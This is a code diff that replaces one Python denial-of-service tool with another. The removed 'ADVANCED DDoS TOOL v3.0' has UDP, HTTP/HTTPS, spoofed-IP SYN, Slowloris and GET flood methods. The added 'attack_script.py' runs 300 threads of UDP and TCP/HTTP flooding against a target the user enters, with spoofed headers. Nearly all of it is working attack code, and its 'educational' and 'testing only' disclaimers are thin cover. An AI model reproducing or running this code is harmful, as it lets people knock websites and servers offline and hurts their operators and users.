@@ -1,463 +1,266 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
+# attack_script.py
 import socket
-import threading
 import random
-import os
 import time
-import sys
-import requests
-import struct
-import ssl
-import http.client
+import threading
 from urllib.parse import urlparse
-from concurrent.futures import ThreadPoolExecutor
-from scapy.all import IP, TCP, send, RandShort
-import colorama
-from colorama import Fore, Style, init
 
-# Initialize colorama
-init(autoreset=True)
-
-# ============ COLOR SETTINGS ============
-class Colors:
-    GREEN = Fore.GREEN
-    RED = Fore.RED
-    YELLOW = Fore.YELLOW
-    BLUE = Fore.BLUE
-    MAGENTA = Fore.MAGENTA
-    CYAN = Fore.CYAN
-    WHITE = Fore.WHITE
-    RESET = Style.RESET_ALL
-    BOLD = Style.BRIGHT
-
-# ============ USER AGENTS ============
-USER_AGENTS = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
-    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
-    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0',
-    'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/121.0',
-    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36'
-]
-
-# ============ FAKE IPS ============
-FAKE_IPS = [
-    '192.165.6.6', '192.176.76.7', '192.156.6.6', '192.155.5.5', 
-    '192.143.2.2', '188.142.141.4', '187.122.212.1', '192.153.4.4', 
-    '192.154.32.4', '192.153.53.25', '192.154.54.5', '192.143.43.4', 
-    '192.165.6.9', '188.154.54.3', '10.0.0.1', '172.16.0.1'
-]
-
-# ============ LOGO ============
-LOGO = f"""
-{Colors.MAGENTA}                                         _.oo.
-                 _.u[[/;:,.         .odMMMMMM'
-              .o888UU[[[/;:-.  .o@P^    MMM^
-             oN88888UU[[[/;::-.        dP^
-            dNMMNN888UU[[[/;:--.   .o@P^
-           ,MMMMMMN888UU[[/;::-. o@^
-           NNMMMNN888UU[[[/~.o@P^
-           888888888UU[[[/o@^-..
-          oI8888UU[[[/o@P^:--..
-       .@^  YUU[[[/o@^;::---..
-     oMP     ^/o@P^;:::---..
-  .dMMM    .o@^ ^;::---...
- dMMMMMMM@^`       `^^^^
-YMMMUP^
-{Colors.CYAN}              ╔════════════════════════════════╗
-              ║    🔥 ADVANCED DDoS TOOL v3.0 🔥   ║
-              ║       Created by: MrSanZz         ║
-              ║       Team: JogjaXploit           ║
-              ╚════════════════════════════════════╝
-{Colors.RESET}"""
-
-# ============ MAIN ATTACK CLASS ============
-class AdvancedDDoS:
-    def __init__(self, target, port=None, threads=50, packet_size=65000, boost=False):
+class TrafficAttack:
+    def __init__(self, target, port, duration):
         self.target = target
-        self.port = port
-        self.threads = threads
-        self.packet_size = packet_size
-        self.boost = boost
-        self.running = True
+        self.port = port if port else 80
+        self.duration = duration
+        self.running = False
         self.packets_sent = 0
-        self.lock = threading.Lock()
-        self.host = None
-        self.path = '/'
-        self.scheme = 'http'
-        
-        # Parse target
-        self.parse_target()
-        
-        # If no port specified, use default
-        if not self.port:
-            self.port = 443 if self.scheme == 'https' else 80
-            
-    def parse_target(self):
-        """Parse URL or IP target"""
-        if '://' not in self.target:
-            self.target = 'http://' + self.target
-            
-        parsed = urlparse(self.target)
-        self.host = parsed.hostname
-        self.path = parsed.path or '/'
-        self.scheme = parsed.scheme
-        
-        if not self.host:
-            raise ValueError("Invalid target format!")
-            
-    def show_status(self):
-        """Display attack status"""
-        print(f"""
-{Colors.YELLOW}╔═══════════════════════════════════════════╗
-{Colors.CYAN}║     🚀 ATTACK STATUS 🚀                  ║
-{Colors.YELLOW}╠═══════════════════════════════════════════╣
-{Colors.GREEN}║  Target: {self.host}
-{Colors.GREEN}║  Port: {self.port}
-{Colors.GREEN}║  Threads: {self.threads}
-{Colors.GREEN}║  Packet Size: {self.packet_size} bytes
-{Colors.GREEN}║  Boost Mode: {'✅ Enabled' if self.boost else '❌ Disabled'}
-{Colors.GREEN}║  Scheme: {self.scheme.upper()}
-{Colors.YELLOW}╚═══════════════════════════════════════════╝{Colors.RESET}
-        """)
-
-    # ============ ATTACK METHODS ============
+        self.bytes_sent = 0
+        self.threads = []
+        self.user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
+            "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.0.0"
+        ]
+    
+    def create_http_packet(self):
+        """Create HTTP packet with heavy headers (maximum traffic)"""
+        path = "/" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(5, 20)))
+        headers = [
+            f"GET {path} HTTP/1.1",
+            f"Host: {self.target}",
+            f"User-Agent: {random.choice(self.user_agents)}",
+            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language: en-US,en;q=0.9",
+            "Accept-Encoding: gzip, deflate, br",
+            f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
+            f"Cache-Control: no-cache",
+            f"Connection: keep-alive",
+            f"Content-Length: {random.randint(100, 1000)}",
+            "", ""
+        ]
+        return "\r\n".join(headers).encode()
     
     def udp_flood(self):
-        """UDP Flood Attack"""
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            sock.settimeout(1)
-            
-            while self.running:
-                try:
-                    # Random packet size between 1000 and max
-                    size = random.randint(1000, self.packet_size)
-                    data = random._urandom(size)
-                    
-                    # Send to multiple ports
-                    ports = [self.port]
-                    if self.boost:
-                        ports.extend([random.randint(1, 65535) for _ in range(3)])
-                    
-                    for p in ports:
-                        sock.sendto(data, (self.host, p))
-                        
-                    with self.lock:
-                        self.packets_sent += len(ports)
-                        
-                except socket.error:
-                    continue
-                    
-        except Exception:
-            pass
-        finally:
+        """UDP flood attack (raw traffic)"""
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65535)
+        data = random._urandom(1490)  # 1490 byte packets
+        
+        while self.running:
             try:
+                sock.sendto(data, (self.target, self.port))
+                self.packets_sent += 1
+                self.bytes_sent += 1490
+            except:
+                pass
+    
+    def tcp_flood(self):
+        """TCP flood with heavy HTTP headers (high traffic)"""
+        while self.running:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.5)
+                sock.connect((self.target, self.port))
+                
+                # Send multiple requests in one connection
+                for _ in range(random.randint(3, 8)):
+                    packet = self.create_http_packet()
+                    sock.send(packet)
+                    self.packets_sent += 1
+                    self.bytes_sent += len(packet)
+                    time.sleep(0.001)  # Prevent connection drop
+                
                 sock.close()
             except:
                 pass
-
-    def http_flood(self):
-        """HTTP/HTTPS Flood Attack"""
-        try:
-            while self.running:
-                try:
-                    # Create connection
-                    if self.scheme == 'https':
-                        context = ssl.create_default_context()
-                        context.check_hostname = False
-                        context.verify_mode = ssl.CERT_NONE
-                        conn = http.client.HTTPSConnection(self.host, self.port, context=context, timeout=5)
-                    else:
-                        conn = http.client.HTTPConnection(self.host, self.port, timeout=5)
-                    
-                    # Random headers
-                    headers = {
-                        'User-Agent': random.choice(USER_AGENTS),
-                        'Accept': '*/*',
-                        'Accept-Encoding': 'gzip, deflate, br',
-                        'Accept-Language': random.choice(['en-US,en;q=0.9', 'fa-IR,fa;q=0.9', 'ar-SA,ar;q=0.9']),
-                        'Cache-Control': 'no-cache',
-                        'Pragma': 'no-cache',
-                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
-                        'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
-                        'Connection': random.choice(['keep-alive', 'close']),
-                        'Referer': f"http://{random.choice(FAKE_IPS)}/",
-                    }
-                    
-                    # Random HTTP methods
-                    method = random.choice(['GET', 'POST', 'HEAD', 'PUT'])
-                    
-                    # Random path with params
-                    path = self.path
-                    if '?' not in path:
-                        path += f"?_={random.randint(1,999999)}"
-                    else:
-                        path += f"&_={random.randint(1,999999)}"
-                    
-                    # POST data
-                    if method == 'POST':
-                        body = random._urandom(random.randint(10, 500))
-                        headers['Content-Type'] = 'application/x-www-form-urlencoded'
-                        conn.request(method, path, body=body, headers=headers)
-                    else:
-                        conn.request(method, path, headers=headers)
-                    
-                    # Get response and read it
-                    response = conn.getresponse()
-                    response.read()
-                    conn.close()
-                    
-                    with self.lock:
-                        self.packets_sent += 1
-                        
-                    # Small delay to avoid detection
-                    if not self.boost:
-                        time.sleep(random.uniform(0.001, 0.01))
-                        
-                except Exception:
-                    continue
-                finally:
-                    try:
-                        conn.close()
-                    except:
-                        pass
-                        
-        except Exception:
-            pass
-
-    def tcp_syn_flood(self):
-        """TCP SYN Flood Attack"""
-        try:
-            while self.running:
-                try:
-                    # Create packet with spoofed IP
-                    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-                    src_port = random.randint(1024, 65535)
-                    
-                    # Build IP and TCP layers
-                    ip_layer = IP(src=src_ip, dst=self.host)
-                    tcp_layer = TCP(
-                        sport=src_port,
-                        dport=self.port,
-                        flags='S',
-                        seq=random.randint(1000, 4294967295),
-                        window=random.randint(1000, 65535)
-                    )
-                    
-                    # Add TCP options
-                    tcp_layer.options = [
-                        ('MSS', 1460),
-                        ('SAckOK', b''),
-                        ('Timestamp', (random.randint(1, 999999), 0)),
-                        ('NOP', None),
-                        ('WScale', 7),
-                    ]
-                    
-                    # Send packet
-                    send(ip_layer/tcp_layer, verbose=0)
-                    
-                    with self.lock:
-                        self.packets_sent += 1
-                        
-                except Exception:
-                    continue
-                    
-        except Exception:
-            pass
-
-    def slow_loris(self):
-        """Slow Loris Attack - Keep connections open"""
-        if not self.boost:
-            return
-            
-        try:
-            sockets = []
-            # Create initial connections
-            for _ in range(min(200, self.threads * 4)):
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(10)
-                    sock.connect((self.host, self.port))
-                    sock.send(f"GET {self.path} HTTP/1.1\r\n".encode())
-                    sock.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
-                    sock.send(f"Host: {self.host}\r\n".encode())
-                    sockets.append(sock)
-                except:
-                    continue
-            
-            # Keep connections alive
-            while self.running:
-                for sock in sockets[:]:
-                    try:
-                        # Send partial headers periodically
-                        sock.send(f"X-Header-{random.randint(1,999)}: {random.randint(1,9999)}\r\n".encode())
-                        time.sleep(random.uniform(1, 5))
-                    except:
-                        # Reconnect if connection lost
-                        sockets.remove(sock)
-                        try:
-                            new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                            new_sock.connect((self.host, self.port))
-                            sockets.append(new_sock)
-                        except:
-                            pass
-                            
-                with self.lock:
-                    self.packets_sent += len(sockets)
-                    
-        except Exception:
-            pass
-
-    def http_get_flood(self):
-        """HTTP GET Flood with requests library"""
-        try:
-            session = requests.Session()
-            
-            while self.running:
-                try:
-                    # Random headers
-                    headers = {
-                        'User-Agent': random.choice(USER_AGENTS),
-                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                        'Accept-Encoding': 'gzip, deflate, br',
-                        'Accept-Language': 'en-US,en;q=0.9',
-                        'Cache-Control': 'no-cache',
-                        'Pragma': 'no-cache',
-                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
-                    }
-                    
-                    url = f"{self.scheme}://{self.host}:{self.port}{self.path}"
-                    if '?' not in self.path:
-                        url += f"?_={random.randint(1,999999)}"
-                    
-                    if self.scheme == 'https':
-                        session.get(url, headers=headers, timeout=5, verify=False)
-                    else:
-                        session.get(url, headers=headers, timeout=5)
-                    
-                    with self.lock:
-                        self.packets_sent += 1
-                        
-                except Exception:
-                    continue
-                    
-        except Exception:
-            pass
-
-    # ============ START ATTACK ============
+    
     def start(self):
-        """Start all attack threads"""
-        self.show_status()
+        """Start attack with 300 threads (maximum traffic)"""
+        self.running = True
+        self.packets_sent = 0
+        self.bytes_sent = 0
         
-        print(f"{Colors.YELLOW}⚠️  WARNING: This tool is for educational purposes only!{Colors.RESET}")
-        print(f"{Colors.RED}⚠️  Do not use against targets without authorization!{Colors.RESET}")
-        print(f"{Colors.CYAN}💡 Press Ctrl+C to stop the attack{Colors.RESET}\n")
+        # 60% UDP + 40% TCP for maximum traffic
+        for i in range(200):
+            t = threading.Thread(target=self.udp_flood)
+            t.daemon = True
+            t.start()
+            self.threads.append(t)
         
-        input(f"{Colors.GREEN}Press Enter to start the attack...{Colors.RESET}")
+        for i in range(100):
+            t = threading.Thread(target=self.tcp_flood)
+            t.daemon = True
+            t.start()
+            self.threads.append(t)
         
-        # Clear screen
-        os.system('clear' if os.name == 'posix' else 'cls')
-        print(LOGO)
-        print(f"{Colors.GREEN}🚀 Attack started!{Colors.RESET}\n")
-        
-        # Start attack threads
-        attack_threads = []
-        start_time = time.time()
-        
-        # Distribute threads among attack types
-        with ThreadPoolExecutor(max_workers=self.threads * 3) as executor:
-            # Submit attacks
-            for _ in range(self.threads):
-                attack_threads.append(executor.submit(self.udp_flood))
-                attack_threads.append(executor.submit(self.http_flood))
-                attack_threads.append(executor.submit(self.tcp_syn_flood))
-                if self.boost:
-                    attack_threads.append(executor.submit(self.slow_loris))
-                    attack_threads.append(executor.submit(self.http_get_flood))
-            
-            # Show statistics
+        return self
+    
+    def stop(self):
+        """Stop the attack"""
+        self.running = False
+        for t in self.threads:
             try:
-                while self.running:
-                    time.sleep(3)
-                    elapsed = time.time() - start_time
-                    with self.lock:
-                        packets = self.packets_sent
-                        speed = packets / elapsed if elapsed > 0 else 0
-                        print(f"{Colors.CYAN}[{time.strftime('%H:%M:%S')}] {Colors.GREEN}Packets: {packets:,} {Colors.YELLOW}| Speed: {speed:,.0f} p/s {Colors.CYAN}| Active Threads: {len(attack_threads)}{Colors.RESET}")
-                        
-                        # Reset counter every minute
-                        if elapsed > 60:
-                            self.packets_sent = 0
-                            start_time = time.time()
-                            
-            except KeyboardInterrupt:
-                self.running = False
-                print(f"\n{Colors.YELLOW}🛑 Stopping attack...{Colors.RESET}")
-                time.sleep(2)
-                print(f"{Colors.GREEN}✅ Attack stopped!{Colors.RESET}")
-                print(f"{Colors.CYAN}📊 Total packets sent: {self.packets_sent:,}{Colors.RESET}")
+                t.join(timeout=0.5)
+            except:
+                pass
+        self.threads.clear()
+    
+    def get_stats(self):
+        """Get real-time statistics"""
+        return {
+            "packets": self.packets_sent,
+            "bytes": self.bytes_sent,
+            "mb": self.bytes_sent / (1024 * 1024),
+            "gb": self.bytes_sent / (1024 * 1024 * 1024)
+        }
 
-# ============ MAIN FUNCTION ============
+
+def get_target():
+    """Get target URL/IP from user"""
+    while True:
+        target = input("🎯 Enter target URL or IP (e.g., example.com or 192.168.1.1): ").strip()
+        if target:
+            # Remove protocol if exists
+            if target.startswith("http://") or target.startswith("https://"):
+                parsed = urlparse(target)
+                target = parsed.netloc or parsed.path
+                target = target.split("/")[0]
+            return target
+        print("❌ Please enter a valid URL or IP!")
+
+
+def get_port():
+    """Get port from user"""
+    while True:
+        try:
+            port_input = input("🔌 Enter target port (default 80): ").strip()
+            if not port_input:
+                return 80
+            port = int(port_input)
+            if 1 <= port <= 65535:
+                return port
+            print("❌ Port must be between 1 and 65535!")
+        except ValueError:
+            print("❌ Please enter a valid number!")
+
+
+def get_duration():
+    """Get attack duration from user (max 120 seconds)"""
+    while True:
+        try:
+            duration_input = input("⏱️ Enter attack duration in seconds (max 120): ").strip()
+            if not duration_input:
+                print("❌ Please enter a duration!")
+                continue
+            duration = int(duration_input)
+            if duration <= 0:
+                print("❌ Duration must be greater than 0!")
+            elif duration > 120:
+                print("⚠️ Duration exceeds 120 seconds! Setting to maximum 120 seconds.")
+                return 120
+            else:
+                return duration
+        except ValueError:
+            print("❌ Please enter a valid number!")
+
+
+def show_progress(attack_obj, target, port, duration):
+    """Show attack progress"""
+    start_time = time.time()
+    last_packets = 0
+    last_bytes = 0
+    
+    print("\n" + "="*60)
+    print(f"🔥 Attack in progress...")
+    print("="*60)
+    
+    while time.time() - start_time < duration:
+        stats = attack_obj.get_stats()
+        elapsed = int(time.time() - start_time)
+        remaining = duration - elapsed
+        
+        # Calculate speed
+        speed_packets = stats["packets"] - last_packets
+        speed_bytes = stats["bytes"] - last_bytes
+        speed_mbps = (speed_bytes * 8) / (1024 * 1024)  # Convert to Mbps
+        
+        last_packets = stats["packets"]
+        last_bytes = stats["bytes"]
+        
+        # Progress percentage
+        progress = int((elapsed / duration) * 100)
+        bar = "█" * (progress // 5) + "░" * (20 - (progress // 5))
+        
+        # Display status
+        print(f"\r[{bar}] {progress}% | "
+              f"📦 {stats['packets']:,} packets | "
+              f"📊 {stats['mb']:.2f} MB | "
+              f"⚡ {speed_mbps:.2f} Mbps | "
+              f"⏱️ {remaining}s remaining", end="")
+        
+        time.sleep(2)
+    
+    print("\n" + "="*60)
+    return True
+
+
 def main():
     """Main function"""
-    # Clear screen
-    os.system('clear' if os.name == 'posix' else 'cls')
+    print("\n" + "="*60)
+    print("🔥   Heavy Traffic Test Tool   🔥")
+    print("="*60)
+    print("⚠️  For testing purposes only on test websites!")
+    print("="*60 + "\n")
     
-    # Show logo
-    print(LOGO)
+    # Get information from user
+    target = get_target()
+    port = get_port()
+    duration = get_duration()
+    
+    # Final confirmation
+    print("\n" + "-"*60)
+    print("📋 Attack Information:")
+    print(f"   🎯 Target: {target}")
+    print(f"   🔌 Port: {port}")
+    print(f"   ⏱️ Duration: {duration} seconds")
+    print(f"   📡 Method: TCP+UDP Flood (Heavy)")
+    print("-"*60)
+    
+    confirm = input("\n✅ Start the attack? (y/n): ").strip().lower()
+    if confirm != 'y':
+        print("❌ Attack cancelled!")
+        return
+    
+    # Start attack
+    print("\n⏳ Preparing and starting attack...")
+    attack_obj = TrafficAttack(target, port, duration)
+    attack_obj.start()
     
     try:
-        # Get target information
-        print(f"{Colors.WHITE}╔═══════════════════════════════════════════╗")
-        print(f"{Colors.WHITE}║           CONFIGURATION                   ║")
-        print(f"{Colors.WHITE}╚═══════════════════════════════════════════╝{Colors.RESET}")
-        
-        target = input(f"{Colors.CYAN}📌 Target (URL or IP): {Colors.WHITE}")
-        if not target:
-            raise ValueError("Target cannot be empty!")
-            
-        port_input = input(f"{Colors.CYAN}🔌 Port (default: auto): {Colors.WHITE}")
-        port = int(port_input) if port_input else None
-        
-        packet_input = input(f"{Colors.CYAN}📦 Packet Size (default: 65000): {Colors.WHITE}")
-        packet_size = int(packet_input) if packet_input else 65000
-        
-        thread_input = input(f"{Colors.CYAN}🧵 Threads (default: 50): {Colors.WHITE}")
-        threads = int(thread_input) if thread_input else 50
-        
-        boost_input = input(f"{Colors.CYAN}⚡ Boost Mode (y/n): {Colors.WHITE}").lower()
-        boost = boost_input == 'y' or boost_input == 'yes'
-        
-        # Create attack object
-        attack = AdvancedDDoS(target, port, threads, packet_size, boost)
-        
-        # Start attack
-        attack.start()
-        
+        # Show progress
+        show_progress(attack_obj, target, port, duration)
     except KeyboardInterrupt:
-        print(f"\n{Colors.YELLOW}🛑 Exiting...{Colors.RESET}")
-        sys.exit(0)
-        
-    except ValueError as e:
-        print(f"{Colors.RED}❌ Error: {e}{Colors.RESET}")
-        time.sleep(3)
-        
-    except Exception as e:
-        print(f"{Colors.RED}❌ Unexpected error: {e}{Colors.RESET}")
-        time.sleep(3)
+        print("\n\n⚠️ Attack stopped by user!")
+    finally:
+        # Stop attack
+        attack_obj.stop()
+    
+    # Final statistics
+    final_stats = attack_obj.get_stats()
+    print("\n" + "="*60)
+    print("✅ Attack completed!")
+    print("="*60)
+    print(f"📊 Final Statistics:")
+    print(f"   📦 Total packets: {final_stats['packets']:,}")
+    print(f"   📊 Total traffic: {final_stats['mb']:.2f} MB ({final_stats['gb']:.3f} GB)")
+    print(f"   ⏱️ Duration: {duration} seconds")
+    print(f"   🎯 Target: {target}")
+    print("="*60)
+    print("🔒 Attack stopped.")
 
-# ============ RUN ============
+
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print(f"\n{Colors.YELLOW}🛑 Exiting...{Colors.RESET}")
-        sys.exit(0)
+        print("\n\n⚠️ Program closed!")
